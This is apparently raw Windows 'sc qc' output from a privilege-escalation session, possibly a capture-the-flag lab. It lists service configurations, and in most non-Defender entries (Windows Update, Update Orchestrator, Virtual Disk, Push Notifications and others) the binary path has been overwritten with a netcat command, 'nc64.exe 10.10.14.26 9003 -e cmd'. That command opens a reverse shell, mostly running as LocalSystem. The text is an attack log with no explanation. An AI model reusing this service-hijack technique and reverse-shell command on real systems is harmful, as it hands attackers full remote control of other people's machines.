+SERVICE_NAME: UsoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: vds
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Virtual Disk
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WaaSMedicSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Update Medic Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WdBoot
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 0   BOOT_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : \SystemRoot\system32\drivers\wd\WdBoot.sys
+        LOAD_ORDER_GROUP   : Early-Launch
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Antivirus Boot Driver
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WdFilter
+        TYPE               : 2  FILE_SYSTEM_DRIVER 
+        START_TYPE         : 0   BOOT_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : \SystemRoot\system32\drivers\wd\WdFilter.sys
+        LOAD_ORDER_GROUP   : FSFilter Anti-Virus
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Antivirus Mini-Filter Driver
+        DEPENDENCIES       : FltMgr
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WdNisDrv
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : system32\drivers\wd\WdNisDrv.sys
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Antivirus Network Inspection System Driver
+        DEPENDENCIES       : BFE
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WdNisSvc
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1910.4-0\NisSrv.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Antivirus Network Inspection Service
+        DEPENDENCIES       : WdNisDrv
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WinDefend
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.1910.4-0\MsMpEng.exe"
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Antivirus Service
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WinHttpAutoProxySvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : WinHTTP Web Proxy Auto-Discovery Service
+        DEPENDENCIES       : Dhcp
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WpnUserService
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Push Notifications User Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WpnUserService_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Push Notifications User Service_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: wuauserv
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Update
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
